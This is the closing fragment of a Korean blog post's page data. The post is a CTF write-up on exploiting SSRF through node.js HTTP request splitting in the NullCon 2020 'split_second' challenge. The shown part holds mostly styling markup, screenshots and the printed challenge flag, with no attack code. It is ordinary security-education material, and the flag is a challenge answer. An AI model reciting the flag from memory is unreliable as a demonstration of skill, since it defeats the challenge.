class=\"mtk1\">.</span><span class=\"mtk4\">url</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>이제 스크립트를 실행해서 flag 문자열이 포함한 결과 값이 있는지 확인 합니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 638px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.666666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAeUlEQVQI122MWQoCMRBEcwvJ2okEAsGsiv/e/1Dl9IQRt49HNU3VEzFGMET0wjn3BkFbv/9DCPB+3VprGGN+EK01lFL2Igu4bK3dcgk9WZxJQikFKVcyPP4nFdc5wdJaK8YYGx0pJfTekfMF95nxuJ0g1efwkOkv4RPAg1K0AlwFcwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Er41R6tyvAyUaNZT2WhH20img\"\n        title=\"Er41R6tyvAyUaNZT2WhH20img\"\n        src=\"/static/9ffb96496065c1562951deea78a90e5c/41be6/Er41R6tyvAyUaNZT2WhH20img.png\"\n        srcset=\"/static/9ffb96496065c1562951deea78a90e5c/5a46d/Er41R6tyvAyUaNZT2WhH20img.png 300w,\n/static/9ffb96496065c1562951deea78a90e5c/0a47e/Er41R6tyvAyUaNZT2WhH20img.png 600w,\n/static/9ffb96496065c1562951deea78a90e5c/41be6/Er41R6tyvAyUaNZT2WhH20img.png 638w\"\n        sizes=\"(max-width: 638px) 100vw, 638px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>flag.txt 파일이 현재 경로에 있는 것을 볼 수 있습니다.</p>\n<p>이제 출력 해봅니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 727px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAwUlEQVQY03WQWQqEMBBEvYa4Z9EskhgQZBhxPub+Z6pJRxRn+3gkRajqSmfOOWitMSgFxhiEEOi6LkGauOq2bVFVFeq6fqMsSxRFgSxME8bRou97NE2TTIeBNHHVZMzz/AsKo7dsioHWGqjYUkoJE0/OOdQwoI+aMZ6GDHEgDaX7Yf4kNXxsG9b1jmVZYtMR3u8rsNZCKY3JKYxWpzAh+BlG56/gLISQzLRL7z3meYYxZg+2Ds9bbCtpT+355X8NiRc2ZIyGkmLrnAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"oWnMozHLDHITWjr7H56NrKimg\"\n        title=\"oWnMozHLDHITWjr7H56NrKimg\"\n        src=\"/static/cad1e7d2b29051b6fcfa89e0376d43d5/c54b3/oWnMozHLDHITWjr7H56NrKimg.png\"\n        srcset=\"/static/cad1e7d2b29051b6fcfa89e0376d43d5/5a46d/oWnMozHLDHITWjr7H56NrKimg.png 300w,\n/static/cad1e7d2b29051b6fcfa89e0376d43d5/0a47e/oWnMozHLDHITWjr7H56NrKimg.png 600w,\n/static/cad1e7d2b29051b6fcfa89e0376d43d5/c54b3/oWnMozHLDHITWjr7H56NrKimg.png 727w\"\n        sizes=\"(max-width: 727px) 100vw, 727px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<blockquote>\n<p>FLAG : hackim20{You<em>must</em>be<em>1337</em>in_JavaScript!}</p>\n</blockquote>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .one-dark-pro {\n    background-color: #282c34;\n    color: #abb2bf;\n  }\n  .one-dark-pro .mtki { font-style: italic; }\n  .one-dark-pro .mtk5 { color: #7F848E; }\n  .one-dark-pro .mtk10 { color: #C678DD; }\n  .one-dark-pro .mtk1 { color: #ABB2BF; }\n  .one-dark-pro .mtk4 { color: #E06C75; }\n  .one-dark-pro .mtk8 { color: #56B6C2; }\n  .one-dark-pro .mtk6 { color: #98C379; }\n  .one-dark-pro .mtk3 { color: #61AFEF; }\n  .one-dark-pro .mtk7 { color: #D19A66; }\n  .one-dark-pro .mtk11 { color: #E5C07B; }\n  .one-dark-pro .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>","tableOfContents":"<ul>\n<li><a href=\"/Security/nodejs-HTTP-request-splitting%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-SSRF-%EC%B7%A8%EC%95%BD%EC%A0%90featNullCon2020-splitsecond-WriteUp/#--writeup\">- WriteUp</a></li>\n</ul>","frontmatter":{"date":"2020년 03월 01일","title":"[node.js] : HTTP request splitting을 이용한 SSRF 취약점(feat.NullCon_2020-split_second WriteUp)","tags":["SSRF","CVE"]}}},"pageContext":{"slug":"/Security/nodejs-HTTP-request-splitting을-이용한-SSRF-취약점featNullCon2020-splitsecond-WriteUp/","previous":{"fields":{"slug":"/Writeup/CodeGate-writeup-csp_web/"},"frontmatter":{"title":"CodeGate - writeUp - csp(web)"}},"next":{"fields":{"slug":"/React/React-JS-공적-마스크맵-개발-후기feat-Kakaomap/"},"frontmatter":{"title":"[React JS] - 공적 마스크맵 개발 후기(feat. Kakaomap)"}}}},"staticQueryHashes":["1081905842","63159454"]}